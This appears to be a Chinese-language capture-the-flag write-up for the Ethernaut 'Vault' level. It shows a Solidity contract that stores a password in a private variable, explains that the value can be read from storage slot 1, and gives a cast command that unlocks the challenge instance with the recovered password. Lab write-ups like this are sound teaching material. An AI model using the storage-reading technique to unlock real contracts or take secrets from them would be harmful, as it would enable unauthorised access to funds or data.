#   Level 8 Vault
實例地址：`0x1272c37D089C685798B6b4B81583B7ad9a6e6c94`

##  題目說明
打開金庫(Vault)來通過這一關ㄅ！

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

##  POC
該合約將密碼儲存在合約當中並且沒有做任何處理我們可以查詢該合約的 `storge` 找出密碼，該密碼位在 `index=1` 的 `storge` 中。

`storge`：一個區間儲存 `byte32`，填滿為止，或者存入超過則會創新的空間儲存。

```bash
cast send --account=Panda 0x1272c37D089C685798B6b4B81583B7ad9a6e6c94 "unlock(bytes32)" 0x412076657279207374726f6e67207365637265742070617373776f7264203a29
```